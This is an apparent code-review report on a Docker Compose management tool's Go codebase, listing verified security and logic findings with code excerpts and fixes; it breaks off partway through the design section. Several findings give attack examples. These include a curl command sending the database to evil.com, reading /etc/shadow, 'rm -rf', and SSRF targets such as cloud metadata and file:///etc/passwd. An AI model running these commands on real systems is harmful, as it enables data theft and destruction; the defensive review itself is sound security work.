# Composer Code Review -- Verified Findings

**Date:** 2026-04-09
**Scope:** Full codebase review of Composer v0.2.2 (all Go backend, API, infra, domain, and deployment code)
**Methodology:** Every finding below was verified by reading the exact source lines cited, then re-verified in a second pass. Line numbers are accurate as of this commit.

---

## Summary Table

| ID   | Severity | Category | Title | Status |
|------|----------|----------|-------|--------|
| S1   | CRITICAL | Security | Git credentials stored in plaintext in database | Verified |
| S2   | CRITICAL | Security | Pipeline `shell_command` enables arbitrary host command execution | Verified |
| S3   | HIGH     | Security | Pipeline `http_request` step vulnerable to SSRF | Verified |
| S4   | HIGH     | Security | `Compose.Exec()` uses insufficient blocklist instead of allowlist | Verified |
| S5   | HIGH     | Security | Webhook HMAC secrets stored in plaintext | Verified |
| S6   | HIGH     | Security | Session tokens stored in plaintext in database | Verified |
| S7   | HIGH     | Security | Webhook secret exposed via GET/PUT API responses | Verified |
| S8   | MEDIUM   | Security | No Content-Security-Policy header; external scripts loaded | Verified |
| S9   | MEDIUM   | Security | OpenAPI spec publicly accessible without authentication | Verified |
| S10  | MEDIUM   | Security | RealIP middleware unconditionally trusts proxy headers | Verified |
| S11  | MEDIUM   | Security | Container/terminal endpoints operate on any Docker container | Verified |
| S12  | LOW      | Security | Rate limiter cleanup goroutine has no cancellation mechanism | Verified |
| S13  | LOW      | Security | OAuth users indistinguishable from password users in database | Verified |
| L1   | HIGH     | Logic    | Pipeline cancellation does not actually stop running goroutines | Verified |
| L2   | HIGH     | Logic    | `RecordStepResult` sets incorrect `FinishedAt` when `ContinueOnError` applies | Verified |
| L3   | MEDIUM   | Logic    | `Pull` operation missing per-stack lock | Verified |
| L4   | MEDIUM   | Logic    | Diff endpoint produces false positives (raw vs normalized comparison) | Verified |
| L5   | MEDIUM   | Logic    | Container log parsing corrupts TTY output | Verified |
| L6   | MEDIUM   | Logic    | Cron scheduler triggers duplicate concurrent runs | Verified |
| L7   | MEDIUM   | Logic    | Webhook delivery history never recorded | Verified |
| L8   | LOW      | Logic    | Event bus silently drops events with no observability | Verified |
| L9   | LOW      | Logic    | Stack locks map grows without bound | Verified |
| D1   | --       | Design   | Slack notification always shows failure icon for `pipeline.run.finished` | Verified |
| D2   | --       | Design   | No compose file validation before persist | Noted |
| D3   | --       | Design   | No pagination on list endpoints | Noted |
| D4   | --       | Design   | No session sliding window / refresh | Noted |

---

## SECURITY FINDINGS

### S1. CRITICAL -- Git credentials stored in plaintext in database

**Files:**
- `internal/infra/store/stack_repo.go:155-167`
- `internal/infra/store/migrations/001_initial.sql:58`
- `internal/domain/stack/aggregate.go:46-52`

**Verified code:**

In `stack_repo.go`, the `marshalCredentials` function serializes git credentials as plain JSON:

```go
// stack_repo.go:155-167
func marshalCredentials(creds *stack.GitCredentials) *string {
    if creds == nil {
        return nil
    }
    b, err := json.Marshal(creds)
    if err != nil {
        return nil
    }
    s := string(b)
    return &s
}
```

The `GitCredentials` struct contains sensitive fields (`aggregate.go:45-52`):

```go
// GitCredentials holds encrypted credential data for git authentication.
// ^^^ NOTE: This comment is misleading -- the data is NOT encrypted.
type GitCredentials struct {
    Token            string
    SSHKey           string // PEM-encoded private key content
    SSHKeyPassphrase string // optional passphrase for the SSH key
    Username         string
    Password         string
}
```

The struct's own doc comment claims "encrypted credential data" but no encryption exists anywhere in the codebase (verified: `grep -r "encrypt\|Encrypt\|AES\|cipher\|Seal\|GCM" internal/` returns zero code matches -- only the misleading comment).

The database column is plain `TEXT` (`001_initial.sql:58`):

```sql
credentials  TEXT,
```

**Impact:** Anyone with read access to the SQLite file (`/opt/composer/composer.db`) or the PostgreSQL database gets all git tokens, SSH private keys, key passphrases, and basic auth passwords in cleartext. For SQLite, this is a file on disk readable by the `composer` user.

**Recommendation:** Encrypt credentials at rest using AES-256-GCM with a key derived from a `COMPOSER_ENCRYPTION_KEY` environment variable. Decrypt only in memory when needed for git operations.

---

### S2. CRITICAL -- Pipeline `shell_command` enables arbitrary host command execution

**File:** `internal/app/pipeline_executor.go:163-176`

**Verified code:**

```go
// pipeline_executor.go:163-176
case pipeline.StepShellCommand:
    command, _ := step.Config["command"].(string)
    if command == "" {
        return "", fmt.Errorf("shell_command: missing command config")
    }
    // NOTE: This intentionally executes arbitrary commands -- pipelines are operator-only.
    // Restrict PATH to common system directories and disable history.
    cmd := exec.CommandContext(ctx, "sh", "-c", command)
    cmd.Env = append(cmd.Environ(),
        "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
        "HISTFILE=/dev/null",
    )
    out, err := cmd.CombinedOutput()
    return string(out), err
```

**Analysis:** The `command` value comes from the pipeline step's `Config` map, which is set by the API request body when creating/updating a pipeline. This is gated to `operator` role (`handler/pipeline.go:87-88`), but the command is passed directly to `sh -c` with zero sanitization.

The PATH restriction on line 172 and HISTFILE on line 173 are cosmetic mitigations -- they don't restrict what `sh -c` can do. An operator can:
- `cat /etc/shadow`
- `curl -d @/opt/composer/composer.db https://evil.com`
- `rm -rf /opt/stacks`
- Access the Docker socket directly
- Install packages, create reverse shells, etc.

The `cmd.Environ()` call on line 171 also inherits the process's full environment, which may include database URLs, Valkey URLs, and OAuth secrets.

**Impact:** Any user with `operator` role gets unrestricted shell access on the host, equivalent to root access. Since Composer runs with Docker socket access, this also means full Docker control.

**Recommendation:**
1. Execute commands inside a throwaway container (like CI/CD systems)
2. Or require `admin` role and document this as "equivalent to host shell access"
3. At minimum, scrub the inherited environment (`cmd.Env` should be built from scratch, not from `cmd.Environ()`)

---

### S3. HIGH -- Pipeline `http_request` step vulnerable to SSRF

**File:** `internal/app/pipeline_executor.go:194-202`

**Verified code:**

```go
// pipeline_executor.go:194-202
case pipeline.StepHTTPRequest:
    // Simple HTTP check (expand later)
    url, _ := step.Config["url"].(string)
    if url == "" {
        return "", fmt.Errorf("http_request: missing url config")
    }
    cmd := exec.CommandContext(ctx, "curl", "-sf", "-o", "/dev/null", "-w", "%{http_code}", url)
    out, err := cmd.CombinedOutput()
    return strings.TrimSpace(string(out)), err
```

**Analysis:** The `url` parameter is user-controlled with no validation. An operator can specify:
- `http://169.254.169.254/latest/meta-data/` -- AWS/GCP/Azure metadata endpoints
- `http://localhost:8080/api/v1/...` -- Composer's own API (with potentially different auth context)
- `http://postgres:5432/` -- Internal database
- `http://valkey:6379/` -- Internal cache
- `file:///etc/passwd` -- curl supports `file://` protocol by default
- `gopher://...` -- curl may support gopher protocol for more complex attacks

Additionally, this shells out to `curl` rather than using Go's `net/http`, which means any curl-supported protocol is available.

**Impact:** An operator can probe and potentially extract data from internal services, cloud metadata endpoints, and local files.

**Recommendation:**
1. Use Go's `net/http` with a custom `Transport` that rejects connections to private/reserved IP ranges
2. Validate URL scheme (only allow `http://` and `https://`)
3. Resolve DNS and check the IP is not private before connecting

---

### S4. HIGH -- `Compose.Exec()` uses insufficient blocklist instead of allowlist

**Files:**
- `internal/api/handler/stack.go:356-391`
- `internal/infra/docker/compose.go:73-78`

**Verified code in handler:**

```go
// stack.go:366-370
// Block dangerous subcommands that could escape the stack context
blocked := map[string]bool{"rm": true, "kill": true}
if blocked[args[0]] {
    return nil, huma.Error422UnprocessableEntity("command '" + args[0] + "' is not allowed via the console; use the UI actions instead")
}
```

**Verified code in compose wrapper (no additional validation):**

```go
// compose.go:76-78
func (c *Compose) Exec(ctx context.Context, stackDir string, composeArgs []string) (*ComposeResult, error) {
    return c.run(ctx, stackDir, composeArgs...)
}
```

**Analysis:** Only `rm` and `kill` are blocked. The following dangerous subcommands are allowed:

| Command | Risk |
|---------|------|
| `exec <service> sh` | Interactive shell in any container in the stack |
| `run --entrypoint sh <service>` | Creates a new container with shell access |
| `run --rm -v /:/host <service> cat /host/etc/shadow` | Volume mount escape (if compose file is modified first) |
| `down --volumes` | Destroys all volumes (data loss) |
| `up --build` | Builds images, could execute arbitrary Dockerfile commands |
| `cp` | Copy files in/out of containers |

The handler's own docstring on lines 354-355 even documents `exec web env` as an example use case, acknowledging shell access is intended.

**Recommendation:** Replace the blocklist with an allowlist of known-safe subcommands: `ps`, `logs`, `top`, `config`, `images`, `port`, `version`. If `exec` access is desired, make it a separate endpoint with additional controls.

---

### S5. HIGH -- Webhook HMAC secrets stored in plaintext

**File:** `internal/infra/store/migrations/001_initial.sql:66-77`

**Verified code:**

```sql
-- 001_initial.sql:66-77
CREATE TABLE IF NOT EXISTS webhooks (
    id            TEXT PRIMARY KEY,
    stack_name    TEXT NOT NULL REFERENCES stacks(name) ON DELETE CASCADE,
    provider      TEXT NOT NULL DEFAULT 'generic'
                  CHECK (provider IN ('github', 'gitlab', 'gitea', 'bitbucket', 'generic')),
    secret        TEXT NOT NULL,
    ...
);
```

The `secret` column stores the HMAC signing secret as plaintext. This secret is generated in `webhook_crud.go:245-248`:

```go
func generateWebhookSecret() string {
    b := make([]byte, 32)
    rand.Read(b)
    return hex.EncodeToString(b)
}
```

**Impact:** Database read access exposes all webhook secrets. An attacker with the secret can forge valid webhook deliveries that trigger git sync + redeploy operations, potentially deploying malicious code.

**Recommendation:** Encrypt webhook secrets at rest using the same mechanism recommended for git credentials.

---

### S6. HIGH -- Session tokens stored in plaintext in database

**File:** `internal/infra/store/migrations/001_initial.sql:16-22`

**Verified code:**

```sql
-- 001_initial.sql:16-22
CREATE TABLE IF NOT EXISTS sessions (
    id         TEXT PRIMARY KEY,  -- This IS the session token
    user_id    TEXT NOT NULL REFERENCES users(id) ON DELETE CASCADE,
    role       TEXT NOT NULL,
    created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
    expires_at TIMESTAMP NOT NULL
);
```

The session `id` field is the actual session token (generated in `domain/auth/session.go:57-62` as 32 bytes of `crypto/rand`, base64url-encoded). This same value is set as the `composer_session` cookie. The token is stored directly as the primary key.

**Contrast with API keys:** API keys are correctly hashed before storage (`domain/auth/apikey.go:72-76`):

```go
func HashAPIKey(plaintext string) string {
    h := sha256.Sum256([]byte(plaintext))
    return hex.EncodeToString(h[:])
}
```

Sessions do not receive this treatment.

**Impact:** A database leak exposes all active session tokens. An attacker can set `composer_session=<token>` in their browser and immediately hijack any active session (admin, operator, or viewer).

**Recommendation:** Hash session tokens with SHA-256 before storage. On lookup, hash the incoming cookie value and compare against the stored hash. This is the same proven pattern already used for API keys in this codebase.

---

### S7. HIGH -- Webhook secret exposed via GET/PUT API responses

**File:** `internal/api/handler/webhook_crud.go:132-140, 179-187`

**Verified code (GET endpoint):**

```go
// webhook_crud.go:132-140
out := &dto.WebhookOutput{}
out.Body.ID = w.ID
out.Body.StackName = w.StackName
out.Body.Provider = w.Provider
out.Body.Secret = w.Secret        // <-- Secret returned in response
out.Body.URL = fmt.Sprintf("/api/v1/hooks/%s", w.ID)
out.Body.BranchFilter = w.BranchFilter
out.Body.AutoRedeploy = w.AutoRedeploy
return out, nil
```

**Verified code (PUT endpoint, same pattern):**

```go
// webhook_crud.go:179-187
out.Body.Secret = w.Secret         // <-- Secret returned after update too
```

**Analysis:** The webhook secret should only be shown once at creation time (like API keys). The GET and PUT endpoints re-expose the secret on every call. Any operator who can call `GET /api/v1/webhooks/{id}` can read the secret, and it may be logged in browser network tabs, proxy logs, or audit trails.

**Recommendation:** Only return the secret in the `Create` response. For `Get` and `Update`, return a masked version (e.g., `"wh_****...last4"`) or omit it entirely.

---

### S8. MEDIUM -- No Content-Security-Policy header; external scripts loaded

**Files:**
- `internal/api/middleware/security.go:10-25`
- `internal/api/server.go:102-105`

**Verified security headers set:**

```go
// security.go:12-16
w.Header().Set("X-Content-Type-Options", "nosniff")
w.Header().Set("X-Frame-Options", "DENY")
w.Header().Set("X-XSS-Protection", "1; mode=block")
w.Header().Set("Referrer-Policy", "strict-origin-when-cross-origin")
w.Header().Set("Permissions-Policy", "camera=(), microphone=(), geolocation=()")
```

**Missing:** No `Content-Security-Policy` header.

**Verified external script loading:**

```go
// server.go:102-104
w.Write([]byte(`<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Composer API</title>
<script src="https://unpkg.com/@stoplight/elements/web-components.min.js"></script>
<link rel="stylesheet" href="https://unpkg.com/@stoplight/elements/styles.min.css">
```

**Impact:** The `/docs` page loads JavaScript and CSS from `unpkg.com`. If unpkg is compromised or serves malicious content, the script executes in the context of the Composer domain, with access to the `composer_session` cookie (though it is HttpOnly, the script could still perform actions via the API using the existing session). Without a CSP, there's no browser-side defense against injected scripts.

**Recommendation:** Add a `Content-Security-Policy` header. For the docs page, pin to specific versions of the Stoplight Elements CDN resources with Subresource Integrity (SRI) hashes. For the main Astro app, a strict CSP (`default-src 'self'`) would be ideal.

---

### S9. MEDIUM -- OpenAPI spec publicly accessible without authentication

**File:** `internal/api/middleware/auth.go:22-30`

**Verified code:**

```go
// auth.go:22-30
var bypassPaths = map[string]bool{
    "/api/v1/system/health":  true,
    "/api/v1/auth/bootstrap": true,
    "/api/v1/auth/login":     true,
    "/openapi.json":          true,   // <-- Public
    "/openapi.yaml":          true,   // <-- Public
    "/docs":                  true,   // <-- Public
}
```

**Impact:** The complete OpenAPI 3.1 spec (all 60+ endpoints, request/response schemas, parameter names, authentication schemes) is available to unauthenticated users. This provides a detailed attack surface map to anyone who can reach the server.

**Recommendation:** Either require at least `viewer` authentication for `/openapi.json` and `/openapi.yaml`, or make this configurable via a `COMPOSER_PUBLIC_DOCS=true/false` environment variable (defaulting to `false` in production).

---

### S10. MEDIUM -- RealIP middleware unconditionally trusts proxy headers

**File:** `internal/api/server.go:49`

**Verified code:**

```go
// server.go:49
router.Use(chimiddleware.RealIP)
```

**Analysis:** Chi's `RealIP` middleware replaces `r.RemoteAddr` with the value from `X-Real-IP` or `X-Forwarded-For` headers. When Composer is deployed without a reverse proxy (which is a supported configuration per the README), any client can set these headers to:
- Bypass the rate limiter (which uses `r.RemoteAddr` -- `security.go:108`)
- Spoof their IP in audit logs (which reads `r.RemoteAddr` and `X-Real-IP` -- `audit.go:38-39`)
- Evade per-IP login rate limiting

**Recommendation:** Make the `RealIP` middleware conditional on a `COMPOSER_TRUSTED_PROXIES` environment variable. Only apply it when a trusted proxy CIDR is configured. The rate limiter comment on line 101-107 of `security.go` acknowledges this dependency but the actual protection is not implemented.

---

### S11. MEDIUM -- Container/terminal endpoints operate on any Docker container

**Files:**
- `internal/api/ws/terminal.go:34-58`
- `internal/api/handler/container.go:79-125`

**Verified code (terminal):**

```go
// terminal.go:34,58
containerID := r.PathValue("id")
// ... no validation that this container belongs to a Composer-managed stack ...
exec, err := h.dockerClient.ExecAttach(ctx, containerID, []string{shell}, true)
```

**Verified code (container start/stop/restart):**

```go
// container.go:101
if err := h.docker.StartContainer(ctx, input.ID); err != nil {
// ... no validation that this container belongs to a Composer-managed stack ...
```

**Additionally, the `shell` parameter in the terminal handler is user-controlled:**

```go
// terminal.go:40-43
shell := r.URL.Query().Get("shell")
if shell == "" {
    shell = "/bin/sh"
}
```

**Impact:** An operator can:
- Exec into Composer's own container (self-modifying attack)
- Exec into infrastructure containers (Postgres, Valkey) to steal credentials/data
- Stop/restart any container on the Docker host, including non-Composer containers
- Specify any binary as the shell parameter (e.g., `?shell=/usr/bin/python3`)

**Recommendation:** Validate that the target container has the `com.docker.compose.project` label matching a known Composer stack. Validate the `shell` parameter against an allowlist (`/bin/sh`, `/bin/bash`, `/bin/ash`, `/bin/zsh`).

---

### S12. LOW -- Rate limiter cleanup goroutine has no cancellation mechanism

**File:** `internal/api/middleware/security.go:48-55`

**Verified code:**

```go
// security.go:48-55
go func() {
    ticker := time.NewTicker(60 * time.Second)
    defer ticker.Stop()
    for range ticker.C {
        rl.cleanup()
    }
}()
```

**Analysis:** This goroutine runs forever with no `context.Context`, `done` channel, or any other shutdown signal. Since `NewRateLimiter()` is called from `GeneralRateLimit()` (`security.go:125-126`) and `LoginRateLimit()` (`security.go:120-121`), each creates a permanent goroutine. In tests or if the server struct is recreated, goroutines accumulate.

**Impact:** Minor resource leak in production (only 2 goroutines). More impactful in tests where `NewServer()` may be called repeatedly.

**Recommendation:** Accept a `context.Context` parameter and select on `ctx.Done()` alongside the ticker.

---

### S13. LOW -- OAuth users indistinguishable from password users in database

**Files:**
- `internal/api/handler/oauth.go:121-137`
- `internal/infra/store/migrations/001_initial.sql:4-13`

**Verified code:**

```go
// oauth.go:128
user, err = auth.NewUser(email, generateSecureOAuthPlaceholder(), role)
```

```go
// oauth.go:175-178
func generateSecureOAuthPlaceholder() string {
    buf := make([]byte, 64)
    rand.Read(buf)
    return fmt.Sprintf("oauth_%s", hex.EncodeToString(buf))
}
```

**Verified schema:**

```sql
-- 001_initial.sql:4-13
CREATE TABLE IF NOT EXISTS users (
    id            TEXT PRIMARY KEY,
    email         TEXT NOT NULL UNIQUE,
    password_hash TEXT NOT NULL,
    role          TEXT NOT NULL DEFAULT 'viewer'
    -- No auth_provider column
);
```

**Analysis:** OAuth users are created with a random placeholder password hash. There is no column to indicate how a user authenticates. The placeholder starts with `oauth_` but this is only in the plaintext password which is immediately hashed -- the stored hash gives no indication of the auth method.

**Impact:**
- An admin cannot distinguish OAuth users from password users in the user management UI
- An OAuth user could theoretically use the "change password" flow to set a real password and then authenticate both ways
- Password complexity policies cannot be selectively applied

**Recommendation:** Add an `auth_provider TEXT NOT NULL DEFAULT 'local'` column to the `users` table with values like `local`, `github`, `google`. Block password change for OAuth-only users.

---

## LOGIC GAPS

### L1. HIGH -- Pipeline cancellation does not actually stop running goroutines

**Files:**
- `internal/api/handler/pipeline.go:292-315`
- `internal/app/pipeline_service.go:96-121`
- `internal/app/pipeline_executor.go:30-136`

**Verified cancel handler:**

```go
// pipeline.go:303-310
for _, run := range runs {
    if run.Status == pipeline.RunRunning || run.Status == pipeline.RunPending {
        run.Cancel()
        // Persist the cancellation to the database
        if err := h.svc.UpdateRun(ctx, run); err != nil {
            return nil, internalError()
        }
        return nil, nil
    }
}
```

**Verified executor goroutine spawning:**

```go
// pipeline_service.go:111-118
s.wg.Add(1)
go func() {
    defer s.wg.Done()
    result := s.executor.Execute(s.runCtx, p, run)  // run is passed by pointer
    if err := s.runs.Update(context.Background(), result); err != nil && s.logger != nil {
        s.logger.Warn("failed to update pipeline run", zap.String("run_id", run.ID), zap.Error(err))
    }
}()
```

**Verified executor batch loop check:**

```go
// pipeline_executor.go:43-46
for _, batch := range batches {
    if run.Status != pipeline.RunRunning {
        break // cancelled or failed
    }
```

**Analysis of the bug:**

1. The cancel handler calls `run.Cancel()` on a `*Run` pointer loaded from the **database** (via `ListRuns`)
2. This sets `run.Status = RunCancelled` on that in-memory object
3. The handler then calls `UpdateRun` to persist the status change to the **database**
4. Meanwhile, the executor goroutine (spawned at `pipeline_service.go:114`) has its own pointer to the `*Run` object that was created at `pipeline_service.go:105`
5. The executor's `run` variable is a **different pointer** than the one the cancel handler loaded from the DB
6. The executor's batch loop on line 44 checks `run.Status` on **its** in-memory copy, which still says `RunRunning`
7. The executor never re-reads from the database

**Impact:** When a user clicks "cancel" on a running pipeline, the API returns success, the database shows "cancelled", but all pipeline steps continue executing to completion. If a step is a `shell_command` or `compose_up`, it runs uninterrupted.

**Recommendation:** Store a per-run `context.CancelFunc` in a map on `PipelineService`. When cancellation is requested, call the context's cancel function. The executor should pass this context to each step (it already uses `ctx` -- `pipeline_executor.go:61`), and the steps that support context cancellation (like `StepWait` on line 187-191 and `exec.CommandContext` on line 170) will actually stop.

---

### L2. HIGH -- `RecordStepResult` sets incorrect `FinishedAt` when `ContinueOnError` applies

**Files:**
- `internal/domain/pipeline/run.go:69-80`
- `internal/app/pipeline_executor.go:98-122`

**Verified domain code:**

```go
// run.go:69-80
func (r *Run) RecordStepResult(result StepResult) {
    r.StepResults = append(r.StepResults, result)
    if result.Status == RunFailed {
        // Default: first failure fails the run
        r.Status = RunFailed
        now := time.Now().UTC()
        r.FinishedAt = &now       // <-- Sets FinishedAt prematurely
    }
}
```

**Verified executor's workaround:**

```go
// pipeline_executor.go:119-122
// Only resume running if ALL failures were continuable
if !hasHardFailure && run.Status == pipeline.RunFailed {
    run.Status = pipeline.RunRunning   // <-- Resets status, but FinishedAt is still set
}
```

**Analysis:** When a step fails but has `ContinueOnError: true`:

1. `RecordStepResult` is called, which sets `r.Status = RunFailed` AND `r.FinishedAt = &now`
2. The executor checks `hasHardFailure` -- it's `false` because all failures were continuable
3. The executor resets `run.Status` back to `RunRunning`
4. But `run.FinishedAt` is **not** reset to `nil` -- it still points to the time the first continuable failure was recorded
5. Subsequent batches execute normally
6. When the run completes, `run.Complete()` (`run.go:83-90`) checks `r.Status != RunRunning` -- but status was reset to `RunRunning`, so it proceeds and sets `r.FinishedAt` again

**Impact clarification (corrected during re-verification):** If all failures are continuable and the run ultimately succeeds, `Complete()` (run.go:83-90) does overwrite `FinishedAt` with the correct time. So for the happy path (continuable failure -> eventual success), the final timestamp is correct.

However, the bug manifests in these scenarios:
1. A continuable failure occurs in batch N, setting `FinishedAt` to time T1. Then a *hard* failure occurs in batch N+1. The executor breaks the loop (line 44-46) but `FinishedAt` still reflects T1 (the continuable failure), not the time of the actual hard failure in batch N+1. `run.Fail()` is never called -- the run already has `Status=RunFailed` from `RecordStepResult`.
2. Any external observer reading the run between the `RecordStepResult` call and the status reset (lines 103-122) sees an inconsistent state: `Status=RunFailed` + `FinishedAt` set, even though the run will continue.
3. The domain model's `RecordStepResult` violates the principle of least surprise by setting terminal state (`FinishedAt`) for what may be a non-terminal event.

**Recommendation:** Move `ContinueOnError` awareness into the domain method. `RecordStepResult` should accept the step's `ContinueOnError` flag and only set terminal state when appropriate. At minimum, the executor workaround on line 121 should also reset `FinishedAt` to `nil` when restoring `RunRunning` status.

---

### L3. MEDIUM -- `Pull` operation missing per-stack lock

**File:** `internal/app/stack_service.go:281-296`

**Verified code:**

```go
// stack_service.go:281-296
func (s *StackService) Pull(ctx context.Context, name string) (*docker.ComposeResult, error) {
    st, err := s.stacks.GetByName(ctx, name)
    // ... no s.locks.lock(name) / defer s.locks.unlock(name) ...
    result, err := s.compose.Pull(ctx, st.Path)
    // ...
}
```

**Contrast with other methods that DO lock:**
- `Create` (line 76-77): `s.locks.lock(name)` / `defer s.locks.unlock(name)`
- `Update` (line 155-156): locks
- `Delete` (line 191-192): locks
- `Deploy` (line 218-219): locks
- `Stop` (line 241-242): locks
- `Restart` (line 263-264): locks

**Impact:** A `Pull` can run concurrently with a `Deploy`, `Stop`, `Restart`, or another `Pull` on the same stack. Running `docker compose pull` concurrently with `docker compose up` in the same directory can cause unpredictable behavior (partial image updates, failed container starts, etc.).

**Recommendation:** Add `s.locks.lock(name)` / `defer s.locks.unlock(name)` to the `Pull` method.

---

### L4. MEDIUM -- Diff endpoint produces false positives (raw vs normalized comparison)

**Files:**
- `internal/api/handler/stack.go:393-437`
- `internal/infra/docker/compose.go:63-66` (Validate with --quiet)
- `internal/infra/docker/compose.go:68-71` (Config without --quiet)
- `internal/app/stack_service.go:298-308`

**Correction note:** During the second verification pass, I discovered the Diff handler was updated since the initial read. It now correctly calls `h.stacks.Config()` (line 415) instead of `h.stacks.Validate()`. The original claim that "Diff always returns no changes" is **no longer true**. However, a different issue exists:

**Current behavior (verified):**

```go
// stack.go:414-418
configResult, err := h.stacks.Config(ctx, input.Name)
normalizedContent := ""
if err == nil && configResult != nil && configResult.Stdout != "" {
    normalizedContent = configResult.Stdout
}
```

```go
// stack.go:426
diff := app.ComputeDiff(normalizedContent, currentContent)
```

The handler compares `normalizedContent` (from `docker compose config`, which outputs fully-resolved, normalized YAML with expanded short syntax, sorted fields, and injected defaults) against `currentContent` (raw file from disk). These will **always differ in formatting** even when semantically identical, producing false-positive diffs.

For example, a simple `compose.yaml`:
```yaml
services:
  web:
    image: nginx
    ports:
      - 8080:80
```

After `docker compose config` normalization becomes:
```yaml
name: mystack
services:
  web:
    image: nginx
    networks:
      default: null
    ports:
      - mode: ingress
        target: 80
        published: "8080"
        protocol: tcp
```

**Fallback:** If `docker compose config` fails (e.g., Docker not running), line 422-423 falls back to `normalizedContent = currentContent`, which compares the file against itself and always shows no changes.

**Impact:** The diff endpoint either shows false-positive changes (every field Docker normalizes) or no changes (when Docker is unavailable). Neither outcome is useful.

**Recommendation:** Store a "last deployed" snapshot of the compose content at deploy time. Diff the current disk content against this snapshot. This shows actual user edits since the last deployment, which is what users care about.

---

### L5. MEDIUM -- Container log parsing corrupts TTY output

**File:** `internal/api/handler/container.go:156-167`

**Verified code:**

```go
// container.go:156-167
// Strip Docker multiplex headers (8-byte prefix per frame)
raw := string(data)
var lines []string
for _, line := range strings.Split(raw, "\n") {
    // Docker stream header: first 8 bytes are type+size
    if len(line) > 8 {
        line = line[8:]
    }
    if strings.TrimSpace(line) != "" {
        lines = append(lines, line)
    }
}
```

**Analysis:** Docker's multiplexed stream format uses an 8-byte header per **frame**, not per line. A single frame can contain multiple lines, and line boundaries don't align with frame boundaries. This code:

1. Splits the raw binary stream by `\n` (text newlines) -- incorrect for binary-framed data
2. Strips the first 8 bytes of every line over 8 characters -- this means the first 8 characters of real log content are lost on most lines
3. For TTY-mode containers (which is common), Docker does **not** add multiplex headers at all. All 8 bytes stripped are real content.

Additionally, the Docker multiplex header format is: `[stream_type(1)][0(3)][size(4)]` -- the first byte indicates stdout(1) vs stderr(2), followed by 3 zero bytes and a 4-byte big-endian size. Parsing this as text and splitting by newlines is fundamentally wrong.

**Impact:** Log output is corrupted for all containers. For TTY containers, the first 8 characters of every line are lost. For non-TTY containers, the output is garbled because frame boundaries don't align with newlines.

**Recommendation:** Use Docker's `stdcopy.StdCopy` function from `github.com/docker/docker/pkg/stdcopy` to properly demux the stream. Or check whether the container is in TTY mode (via inspect) and skip the header stripping for TTY containers.

---

### L6. MEDIUM -- Cron scheduler triggers duplicate concurrent runs

**File:** `internal/app/cron_scheduler.go:71-103`

**Verified code:**

```go
// cron_scheduler.go:78-101
now := time.Now()
for _, p := range pipelines {
    for _, trigger := range p.Triggers {
        if trigger.Type != pipeline.TriggerCron {
            continue
        }
        cronExpr, _ := trigger.Config["cron"].(string)
        if cronExpr == "" {
            continue
        }
        if shouldRunCron(cronExpr, now) {
            // No check for existing running/pending runs
            if _, err := s.pipelineSvc.Run(ctx, p.ID, fmt.Sprintf("cron(%s)", cronExpr)); err != nil {
                // ...
            }
        }
    }
}
```

**Analysis:** The scheduler runs every minute. If a pipeline has a `* * * * *` (every minute) cron trigger and the previous run takes 2 minutes to complete, the scheduler will trigger a new run every minute with no check for existing active runs. `PipelineService.Run()` creates a new run unconditionally.

**Impact:** Long-running pipelines accumulate concurrent runs, competing for resources. A pipeline that does `docker compose up` could trigger multiple overlapping deploys of the same stack.

**Recommendation:** Before triggering, query `ListRuns` for the pipeline and check if any are in `pending` or `running` state. Skip the trigger if so. Alternatively, track last-trigger time per pipeline to avoid re-triggering within the same cron window.

---

### L7. MEDIUM -- Webhook delivery history never recorded

**Files:**
- `internal/api/handler/webhook.go:30-91` (Receive handler)
- `internal/api/handler/webhook_crud.go:218-237` (ListDeliveries handler)
- `internal/infra/store/migrations/001_initial.sql:80-95` (webhook_deliveries table)

**Verified:** The `webhook_deliveries` table exists in the schema:

```sql
CREATE TABLE IF NOT EXISTS webhook_deliveries (
    id           TEXT PRIMARY KEY,
    webhook_id   TEXT NOT NULL REFERENCES webhooks(id) ON DELETE CASCADE,
    event        TEXT NOT NULL,
    ...
);
```

**Verified:** The `ListDeliveries` endpoint exists and queries this table (`webhook_crud.go:223`).

**Verified:** The `Receive` handler (`webhook.go:30-91`) processes webhooks but **never inserts a row into `webhook_deliveries`**. A grep for `CreateDelivery`, `InsertDelivery`, `LogDelivery`, or `RecordDelivery` across the handler directory returns zero results.

**Impact:** The delivery history endpoint always returns an empty list. Webhook debugging is impossible -- there's no record of which webhooks were received, whether they were processed, whether they triggered a redeploy, or whether they failed.

**Recommendation:** In the `Receive` handler, create a delivery record at the start (status `received`), update it to `processing` before sync, then update to `success`/`failed`/`skipped` based on outcome.

---

### L8. LOW -- Event bus silently drops events with no observability

**File:** `internal/infra/eventbus/memory.go:31-46`

**Verified code:**

```go
// memory.go:39-45
for id, ch := range b.subs {
    select {
    case ch <- evt:
    default:
        // Subscriber is slow -- drop event to avoid blocking
        _ = id
    }
}
```

**Analysis:** The non-blocking send is a correct design choice for preventing producer blocking. However, dropped events are completely invisible -- no log, no metric, no counter.

**Impact:** SSE clients may miss events (container state changes, pipeline updates) with no indication that events were dropped. This makes it difficult to diagnose "UI not updating" issues.

**Recommendation:** Add an atomic counter of dropped events per subscriber. Optionally log at debug level when events are dropped. Consider sending a periodic "heartbeat" event to SSE clients so they can detect connection staleness.

---

### L9. LOW -- Stack locks map grows without bound

**File:** `internal/app/stack_service.go:28-52`

**Verified code:**

```go
// stack_service.go:34-43
func (l *stackLocks) lock(name string) {
    l.mu.Lock()
    m, ok := l.locks[name]
    if !ok {
        m = &sync.Mutex{}
        l.locks[name] = m
    }
    l.mu.Unlock()
    m.Lock()
}
```

**Verified:** The `Delete` method (`stack_service.go:190-213`) locks the stack but never removes the entry from the `locks` map. Over time, after many create/delete cycles, the map accumulates entries for stacks that no longer exist.

**Impact:** Minor memory leak. Each entry is a `string` key + `*sync.Mutex` (~80 bytes). After 10,000 create/delete cycles, this is ~800KB -- negligible but technically unbounded.

**Recommendation:** Either remove the lock entry in `Delete` (being careful about concurrent access), or periodically prune entries for stacks that no longer exist.

---

## DESIGN IMPROVEMENTS

### D1. Slack notification always shows failure icon for `pipeline.run.finished`

**File:** `internal/infra/notify/notifier.go:109-120`

**Verified code:**

```go
// notifier.go:113-116
switch evt.EventType() {
case "stack.error", "pipeline.run.finished":
    emoji = ":x:"
    color = "#f37e96" // red
```

